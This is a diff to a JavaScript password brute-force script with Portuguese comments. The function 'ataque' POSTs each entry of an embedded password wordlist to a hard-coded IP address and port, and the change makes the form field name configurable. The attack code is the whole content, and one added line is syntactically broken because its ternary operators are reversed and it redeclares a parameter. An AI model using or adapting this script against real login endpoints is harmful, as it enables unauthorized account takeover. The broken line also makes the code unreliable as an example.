@@ -1,5 +1,9 @@
-const ataque = (x,z) => {
-	const go = (m) => {
+const ataque = (x,r,z) => {
+	// X → O endereço
+	// r → A requisição
+	// g → Os dados em lista
+	let r = (r === null) : "password" ? r;
+	const go = (m,r) => {
 		// Mudança de variavel pra `g`
 		let g = encodeURIComponent(m)
 		setTimeout(
@@ -7,7 +11,7 @@ const ataque = (x,z) => {
 				`${x}`,
 				{method: "post", headers: {
 					"Content-Type": "application/x-www-form-urlencoded",
-				}, body: "password="+g+""})
+				}, body: r+"="+g+""})
 				.then((x)=>{
 					return x.text()
 				}).then((z)=>{
@@ -1023,4 +1027,4 @@ asdfg1
 marine
 soccer10
 `
-ataque("http://88.198.233.174:59451/", w.split("\n"))
+ataque("http://88.198.233.174:59451/","passwd", w.split("\n"))
